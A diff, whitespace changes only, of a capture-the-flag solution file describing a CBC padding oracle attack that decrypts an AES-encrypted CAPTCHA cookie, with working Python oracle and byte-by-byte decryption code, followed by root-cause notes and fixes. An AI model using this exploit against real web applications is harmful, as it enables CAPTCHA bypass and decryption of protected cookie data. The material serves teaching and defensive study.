@@ -18,10 +18,10 @@ tricks:
       # 1. CAPTCHA image shows only first 8 characters: "ZJENENLF......"
       # 2. Full CAPTCHA is 14 characters (impossible to guess remaining 6)
       # 3. CAPTCHA value is stored in encrypted 'captcha' cookie
-      # 
+      #
       # Cookie example:
       # captcha=O8h8XIaL+aMm0ZB2oVuNbyApz6L9WMkpV5Rh76rFdPs=
-      # 
+      #
       # Base64 decode reveals 32 bytes:
       # 16 bytes IV + 16 bytes ciphertext
       # This suggests AES-CBC encryption
@@ -33,16 +33,16 @@ tricks:
       # Test 1: Submit with valid cookie but wrong CAPTCHA
       POST / with captcha="wrongguess"
       Response: "Invalid CAPTCHA!" (403 status)
-      
+
       # Test 2: Modify last byte of encrypted cookie
       modified_cookie = tamper_cookie(original_cookie, position=-1, value=random())
       POST / with modified_cookie and captcha="test"
       Response: "Invalid padding"
-      
+
       # Key discovery: Two different error messages!
       # - "Invalid padding" = decryption failed (bad padding)
       # - "Invalid CAPTCHA!" = decryption succeeded, wrong answer
-      # 
+      #
       # This is a padding oracle vulnerability!
 
   - name: "Step 3: Understand CBC padding oracle"
@@ -51,18 +51,18 @@ tricks:
     payload: |
       # CBC decryption:
       # Plaintext = Decrypt(Ciphertext) XOR IV
-      # 
+      #
       # Key insight:
       # - We can modify the IV
       # - Server tells us if padding is valid
       # - By trying different IV values, we can deduce plaintext
-      # 
+      #
       # For each byte position (starting from last):
       # 1. Set known bytes to produce correct padding (0x01, 0x02, etc.)
       # 2. Brute force current byte (try 0-255)
       # 3. When padding is valid, we found the intermediate value
       # 4. XOR with original IV to get plaintext byte
-      # 
+      #
       # Attack formula:
       # intermediate[i] = guess XOR padding_value (when oracle returns valid)
       # plaintext[i] = intermediate[i] XOR original_iv[i]
@@ -72,66 +72,66 @@ tricks:
     how: "Automate byte-by-byte decryption using padding oracle"
     payload: |
       # Core algorithm: Recover plaintext byte-by-byte from last to first
-      # 
+      #
       # Key insight: We modify the IV to control what gets XORed with the decrypted ciphertext
       # When we get valid padding, we know the intermediate value
-      # 
+      #
       # Algorithm for each byte position (from byte 15 down to 0):
       # 1. Calculate padding_value = 16 - byte_pos (e.g., for byte 15, padding_value = 1)
       # 2. Create test_iv: set known bytes to produce correct padding pattern
       # 3. Brute force current byte (0-255)
       # 4. When oracle returns valid padding, we found: intermediate[byte_pos] = guess ^ padding_value
       # 5. Calculate plaintext: plaintext[byte_pos] = intermediate[byte_pos] ^ original_iv[byte_pos]
-      
+
       def padding_oracle(ciphertext_b64):
           # Send POST with modified cookie
           # Return True if "Invalid padding" NOT in response (padding is valid)
           # Return False if "Invalid padding" in response (padding is invalid)
-          response = requests.post(TARGET_URL, cookies={'captcha': ciphertext_b64}, 
+          response = requests.post(TARGET_URL, cookies={'captcha': ciphertext_b64},
                                  data={'captcha': '', 'csrf_token': '', 'username': 'test'},
                                  allow_redirects=False, timeout=5)
           return "Invalid padding" not in response.text
-      
+
       def decrypt_block(iv, ciphertext_block, oracle_func):
           block_size = 16
           intermediate = bytearray(block_size)
-          
+
           # Decrypt from last byte (15) to first (0)
           for byte_pos in range(block_size - 1, -1, -1):
               padding_value = block_size - byte_pos
               test_iv = bytearray(block_size)
-              
+
               # Set known bytes to produce correct padding pattern
               for known_pos in range(byte_pos + 1, block_size):
                   test_iv[known_pos] = intermediate[known_pos] ^ padding_value
-              
+
               # Brute force current byte
               for guess in range(256):
                   test_iv[byte_pos] = guess
                   test_ciphertext = bytes(test_iv) + ciphertext_block
-                  
+
                   if oracle_func(base64.b64encode(test_ciphertext).decode()):
                       # Found! Calculate intermediate value
                       intermediate[byte_pos] = guess ^ padding_value
                       break
-          
+
           # Calculate final plaintext: intermediate XOR original IV
           plaintext = bytes([intermediate[i] ^ iv[i] for i in range(block_size)])
           return plaintext
-      
+
       # Extract IV and ciphertext from base64 cookie
       encrypted = base64.b64decode(captcha_cookie)
       iv = encrypted[:16]
       ciphertext = encrypted[16:]
-      
+
       # Decrypt the block
       decrypted_block = decrypt_block(iv, ciphertext, padding_oracle)
-      
+
       # Remove PKCS7 padding: last byte indicates padding length
       padding_length = decrypted_block[-1]
       if padding_length <= 16:
           decrypted_captcha = decrypted_block[:-padding_length]
-      
+
       # Result: 14-character CAPTCHA string (e.g., "VPJBC83RC6ADZR")
 
   - name: "Step 5: Submit decrypted CAPTCHA"
@@ -140,13 +140,13 @@ tricks:
     payload: |
       # Important: Use the ORIGINAL encrypted cookie, not a modified one!
       # Server will decrypt the cookie and compare with our submitted value
-      # 
+      #
       # Steps:
       # 1. Extract CSRF token from homepage HTML
       #    Look for: <input type="hidden" name="csrf_token" value="...">
       response = requests.get(TARGET_URL)
       csrf_token = re.search(r'name="csrf_token" value="([^"]+)"', response.text).group(1)
-      
+
       # 2. Submit POST with:
       #    - Cookie: original encrypted captcha cookie (server decrypts it)
       #    - Form data: decrypted CAPTCHA string (what we recovered)
@@ -156,14 +156,14 @@ tricks:
           'csrf_token': csrf_token,
           'username': 'test'
       }
-      
+
       response = requests.post(TARGET_URL, cookies=cookies, data=data)
-      
+
       # Server flow:
       # 1. Decrypts cookie → gets CAPTCHA value
       # 2. Compares with submitted 'captcha' field
       # 3. If match → returns FLAG{...}
-      
+
       # Check response for FLAG pattern
       if "FLAG{" in response.text:
           flag = response.text.strip()
@@ -175,7 +175,7 @@ tricks:
       # Most of the time, the correct value is found in first ~128 tries
       # Average requests: 16 bytes × 128 tries = 2048 requests
       # Typical completion time: 1-2 minutes
-      # 
+      #
       # Can be optimized by:
       # 1. Parallel requests (multiple threads)
       # 2. Smart guessing (common characters first)
@@ -186,19 +186,19 @@ tricks:
     how: "Review PKCS7 padding rules"
     payload: |
       # PKCS7 padding adds bytes to make plaintext a multiple of block size (16)
-      # 
+      #
       # Examples:
       # 14 bytes plaintext → add 2 bytes of 0x02: "VPJBC83RC6ADZR\x02\x02"
       # 15 bytes plaintext → add 1 byte of 0x01: "123456789012345\x01"
       # 16 bytes plaintext → add 16 bytes of 0x10 (full block)
-      # 
+      #
       # Valid padding patterns:
       # - Last 1 byte: 0x01
       # - Last 2 bytes: 0x02 0x02
       # - Last 3 bytes: 0x03 0x03 0x03
       # - ...
       # - Last 16 bytes: 0x10 0x10 ... 0x10
-      # 
+      #
       # Invalid padding triggers "Invalid padding" error
 
   - name: "Why this attack works"
@@ -207,13 +207,13 @@ tricks:
     payload: |
       # Root vulnerability:
       # Application reveals whether padding is valid or not
-      # 
+      #
       # Secure approach should be:
       # 1. Return same generic error for all decryption failures
       # 2. Use authenticated encryption (AES-GCM, ChaCha20-Poly1305)
       # 3. Implement encrypt-then-MAC if using CBC
       # 4. Never leak cryptographic operation details
-      # 
+      #
       # In this challenge:
       # - "Invalid padding" = crypto operation failed
       # - "Invalid CAPTCHA!" = crypto succeeded, validation failed
@@ -225,11 +225,11 @@ tricks:
     payload: |
       # Fix 1: Use authenticated encryption
       from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-      
+
       aesgcm = AESGCM(key)
       nonce = os.urandom(12)
       ciphertext = aesgcm.encrypt(nonce, plaintext, None)
-      
+
       # Fix 2: Uniform error handling
       try:
           decrypted = decrypt_and_verify(cookie)
@@ -237,13 +237,11 @@ tricks:
               return "Invalid request", 400
       except Exception:
           return "Invalid request", 400  # Same error!
-      
+
       # Fix 3: Don't hide CAPTCHA characters
       # Show all characters to user, no encryption needed
-      
+
       # Fix 4: Use constant-time comparison
       import hmac
       if not hmac.compare_digest(decrypted, user_input):
           return "Invalid request", 400
-
-
